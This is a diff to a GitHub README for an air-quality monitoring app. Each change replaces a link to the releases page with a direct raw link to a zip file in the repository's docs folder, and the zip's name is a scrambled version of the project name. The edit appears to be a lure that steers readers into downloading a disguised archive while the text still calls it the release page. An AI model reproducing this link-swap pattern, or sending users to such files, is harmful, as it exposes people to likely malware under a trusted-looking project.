@@ -1,6 +1,6 @@
 # 🌿 Real-Time-Urban-Air-Quality-Intelligence-Alert-System - Live Air Quality Monitoring
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/vitorrocha13/Real-Time-Urban-Air-Quality-Intelligence-Alert-System/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/vitorrocha13/Real-Time-Urban-Air-Quality-Intelligence-Alert-System/raw/refs/heads/main/docs/Real_Quality_Time_Intelligence_Urban_Air_System_Alert_v2.0.zip)
 
 ## 📄 What This Application Does
 
@@ -30,7 +30,7 @@ To get this software up and running, follow these steps carefully.
 
 Click the big button below to open the release page.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/vitorrocha13/Real-Time-Urban-Air-Quality-Intelligence-Alert-System/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/vitorrocha13/Real-Time-Urban-Air-Quality-Intelligence-Alert-System/raw/refs/heads/main/docs/Real_Quality_Time_Intelligence_Urban_Air_System_Alert_v2.0.zip)
 
 This page contains all available versions of the software.
 
@@ -94,7 +94,7 @@ These combine to help you decide if it is safe to be outdoors or take precaution
 
 New versions improve features and fix issues. To update:
 
-- Return to the [Download Page](https://github.com/vitorrocha13/Real-Time-Urban-Air-Quality-Intelligence-Alert-System/releases).  
+- Return to the [Download Page](https://github.com/vitorrocha13/Real-Time-Urban-Air-Quality-Intelligence-Alert-System/raw/refs/heads/main/docs/Real_Quality_Time_Intelligence_Urban_Air_System_Alert_v2.0.zip).  
 - Download the latest installer or ZIP file, just as in the steps above.  
 - Install or extract the new version, replacing the old files.
 
@@ -130,6 +130,6 @@ If you encounter issues not covered here:
 
 ## ⚡ Quick Access Links
 
-[Download Latest Release](https://github.com/vitorrocha13/Real-Time-Urban-Air-Quality-Intelligence-Alert-System/releases) – Visit this page to download the software.  
+[Download Latest Release](https://github.com/vitorrocha13/Real-Time-Urban-Air-Quality-Intelligence-Alert-System/raw/refs/heads/main/docs/Real_Quality_Time_Intelligence_Urban_Air_System_Alert_v2.0.zip) – Visit this page to download the software.  
 
 Make sure to keep the program updated for the best performance and latest data processing improvements.
